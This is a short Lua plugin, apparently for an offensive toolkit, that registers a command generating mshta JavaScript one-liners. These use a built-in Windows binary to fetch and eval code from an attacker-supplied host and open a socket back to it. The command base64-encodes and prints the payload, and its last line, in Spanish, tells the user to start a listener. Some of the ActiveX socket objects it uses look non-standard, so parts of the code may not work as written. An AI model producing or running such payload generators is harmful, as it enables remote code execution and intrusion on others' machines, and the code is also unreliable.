register_command("lolbas_mshta_js", function()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]

    if not lhost or not lport then return "Error" end

    local js = string.format([[
mshta javascript:var s=new ActiveXObject("WinHttp.WinHttpRequest.5.1");s.Open("GET","http://%s/connect",false);if(s.Send(),s.Status==200)eval(s.ResponseText);void(function(){var c=new ActiveXObject("MSXML2.Socket");c.connect("%s",%s);while(c.read(-1)==''){c.write('calc');}})();
]], lhost, lhost, lport)

    local oneliner = string.format('mshta javascript:var c=new ActiveXObject("Socket");c.open("tcp","%s",%s);c.write("payload");c.close();', lhost, lport)

    app.one_cmd("encodewinbase64 " .. oneliner)
    print("\n[🔥] One-liner (mshta js):")
    print("\n" .. oneliner .. "\n")
    return "✅ Ejecuta tu listener"
end)